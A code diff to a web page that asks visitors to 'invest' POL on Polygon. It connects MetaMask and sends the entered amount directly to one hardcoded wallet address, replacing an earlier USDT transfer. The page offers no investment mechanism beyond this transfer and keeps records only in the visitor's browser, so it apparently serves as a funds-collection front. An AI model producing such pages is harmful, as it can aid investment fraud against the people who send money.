@@ -70,7 +70,7 @@ input {
 </div>
 
 <div class="card">
-<h3>💰 Invest (Pol - Polygon)</h3>
+<h3>💰 Invest (POL - Polygon)</h3>
 
 <input id="amount" placeholder="Enter amount (e.g. 10)">
 <button id="investBtn">🚀 Invest Now</button>
@@ -90,12 +90,12 @@ Safe: 0xC8DF...D4E2
 
 </div>
 
-<!-- ============== 关键修复：使用全球最稳定 CDN ============== -->
+<!-- 稳定 CDN -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
 <script>
 
-// ===== 强制等待 MetaMask 注入 =====
+// ===== POL ONLY VERSION - 已移除所有 USDT =====
 async function waitForEthereum() {
   return new Promise(resolve => {
     if (window.ethereum) return resolve(window.ethereum);
@@ -104,49 +104,33 @@ async function waitForEthereum() {
   });
 }
 
-// ===== CONFIG =====
 const SAFE = "0xC8DF3B516616800b2709F66e1bee7520aBAbD4E2";
-
-
-const ERC20 = [
-  "function transfer(address to, uint256 amount) returns (bool)",
-  "function balanceOf(address account) view returns (uint256)"
-];
 
 let provider, signer, user;
 let isProcessing = false;
 
 // ===== CONNECT WALLET =====
 async function connectWallet(){
-
   if (typeof ethers === 'undefined') {
     alert("ethers.js 加载失败\n请强制刷新页面后重试（Ctrl + Shift + R）");
     return;
   }
 
   try {
-
     const ethereum = await waitForEthereum();
-
     if(!ethereum){
       alert("MetaMask not detected");
       return;
     }
 
-    const accounts = await ethereum.request({
-      method: "eth_requestAccounts"
-    });
-
+    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
     user = accounts[0];
 
     provider = new ethers.providers.Web3Provider(ethereum);
     signer = provider.getSigner();
 
-    document.getElementById("wallet").innerText =
-      "Connected: " + user;
-
+    document.getElementById("wallet").innerText = "Connected: " + user;
   } catch(e){
-
     console.error("CONNECT ERROR:", e);
     alert("Wallet connection failed:\n" + e.message);
   }
@@ -154,11 +138,7 @@ async function connectWallet(){
 
 // ===== NETWORK =====
 async function checkNetwork(){
-
-  const chainId = await window.ethereum.request({
-    method: "eth_chainId"
-  });
-
+  const chainId = await window.ethereum.request({ method: "eth_chainId" });
   if(chainId !== "0x89"){
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
@@ -167,16 +147,14 @@ async function checkNetwork(){
   }
 }
 
-// ===== INVEST =====
+// ===== INVEST - 直接发送 POL =====
 async function invest(){
-
   if(isProcessing) return;
   isProcessing = true;
 
   const btn = document.getElementById("investBtn");
 
   try {
-
     if(!signer){
       alert("Connect wallet first");
       return;
@@ -184,9 +162,8 @@ async function invest(){
 
     await checkNetwork();
 
-    let amount = document.getElementById("amount").value;
-
-    if(!amount || amount <= 0){
+    let amount = document.getElementById("amount").value.trim();
+    if(!amount || parseFloat(amount) <= 0){
       alert("Enter valid amount");
       return;
     }
@@ -194,40 +171,36 @@ async function invest(){
     btn.disabled = true;
     btn.innerText = "Processing...";
 
-    const token = new ethers.Contract(USDT, ERC20, signer);
+    document.getElementById("status").innerText = "Checking POL balance...";
 
-    let parsed = ethers.utils.parseUnits(amount, 6);
+    const balance = await provider.getBalance(user);
+    const parsedAmount = ethers.utils.parseEther(amount);
 
-    document.getElementById("status").innerText = "Checking balance...";
-
-    const balance = await token.balanceOf(user);
-
-    if(balance.lt(parsed)){
-      alert("Insufficient USDT");
+    if(balance.lt(parsedAmount)){
+      alert("Insufficient POL balance");
       return;
     }
 
     document.getElementById("status").innerText = "Confirm in wallet...";
 
-    let tx = await token.transfer(SAFE, parsed);
+    const tx = await signer.sendTransaction({
+      to: SAFE,
+      value: parsedAmount
+    });
 
     document.getElementById("status").innerText = "TX: " + tx.hash;
 
     await tx.wait();
 
-    document.getElementById("status").innerText = "Success";
-
+    document.getElementById("status").innerText = "✅ Success! POL sent";
     document.getElementById("amount").value = "";
 
     addHistory(user, amount, tx.hash);
 
   } catch(e){
-
     console.error("INVEST ERROR:", e);
-    document.getElementById("status").innerText = "Error: " + e.message;
-
+    document.getElementById("status").innerText = "Error: " + (e.message || e);
   } finally {
-
     isProcessing = false;
     btn.disabled = false;
     btn.innerText = "🚀 Invest Now";
@@ -236,34 +209,27 @@ async function invest(){
 
 // ===== HISTORY =====
 function addHistory(user, amount, hash){
-
   let history = JSON.parse(localStorage.getItem("investments") || "[]");
-
   history.push({
     user,
-    amount,
+    amount: amount + " POL",
     hash,
     time: new Date().toLocaleString()
   });
-
   localStorage.setItem("investments", JSON.stringify(history));
-
   renderHistory();
 }
 
 function renderHistory(){
-
   let history = JSON.parse(localStorage.getItem("investments") || "[]");
-
   if(history.length === 0){
     document.getElementById("history").innerText = "No records yet";
     return;
   }
-
   document.getElementById("history").innerHTML =
     history.map(h => `
       <div style="margin-bottom:12px;">
-        <b>${h.amount} Pol</b><br>
+        <b>${h.amount}</b><br>
         <small>${h.user.slice(0,6)}...${h.user.slice(-4)}</small><br>
         <a href="https://polygonscan.com/tx/${h.hash}" target="_blank">
           View TX
